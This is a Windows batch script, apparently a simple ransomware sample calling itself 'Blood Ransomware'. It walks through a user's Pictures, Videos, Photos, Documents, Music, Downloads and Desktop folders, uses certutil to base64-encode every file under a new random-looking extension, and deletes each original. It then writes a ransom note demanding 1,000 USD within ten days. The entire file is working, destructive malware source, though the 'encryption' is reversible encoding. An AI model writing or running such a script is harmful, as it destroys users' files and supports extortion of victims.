@echo off
cd C:\Users\%username%\Pictures
For /F "tokens=*" %%A in ('dir /b /s') do (
    certutil -encode "%%~A" "%%~nA.A1Q5pKiC6A2Mb4RC1E4s1aEVV4esQpK7"
    Del /q "%%~A"
)
cd C:\Users\%username%\Videos
For /F "tokens=*" %%A in ('dir /b /s') do (
    certutil -encode "%%~A" "%%~nA.B84EaiC6Af54ec45V4es5x1IUHBG42A"
    Del /q "%%~A"
)
cd C:\Users\%username%\Photos
For /F "tokens=*" %%A in ('dir /b /s') do (
    certutil -encode "%%~A" "%%~nA.b4tc74ik1f2d54Ddc54115GR5reV2qP1"
    Del /q "%%~A"
)
cd C:\Users\%username%\Documents
For /F "tokens=*" %%A in ('dir /b /s') do (
    certutil -encode "%%~A" "%%~nA.hoHtg54GGE54th687G64trdf7sa57fRpQ"
    Del /q "%%~A"
)
cd C:\Users\%username%\Music
For /F "tokens=*" %%A in ('dir /b /s') do (
    certutil -encode "%%~A" "%%~nA.BAr65Dg4F4b4yb4T1b4T45tB4Yrh54sfrBn3QpC"
    Del /q "%%~A"
)
cd C:\Users\%username%\Downloads
For /F "tokens=*" %%A in ('dir /b /s') do (
    certutil -encode "%%~A" "%%~nA.tB4Yrh54sfrBn3QpV35c8qxcGr4cR8QpL0"
    Del /q "%%~A"
)
cd C:\Users\%username%\Desktop
For /F "tokens=*" %%A in ('dir /b /s') do (
    certutil -encode "%%~A" "%%~nA.PqLR0XlUi652sD4T1b4T4Fjw2isdV8E7xAQp"
    Del /q "%%~A"
)
@echo off
BREAK >#Decrypt_MyFiles.txt
ECHO Oh no! Looks like you have been encrypted by Blood Ransomware! >>#Decrypt_MyFiles.txt
ECHO Don't worry, you can still get your encypted files back. You must follow these steps: >>#Decrypt_MyFiles.txt
ECHO 1. Please pay an amount of 1,000 USD to PayPal address: blahblahblah >>#Decrypt_MyFiles.txt
ECHO 2. You must do the payment in 10 days (maximum) >>#Decrypt_MyFiles.txt
ECHO 3. If you will delete this file, you will lose your personal ID making your files undecryptable. >>#Decrypt_MyFiles.txt
ECHO 4. Personal ID: https://www.youtube.com/watch?v=dQw4w9WgXcQ >>#Decrypt_MyFiles.txt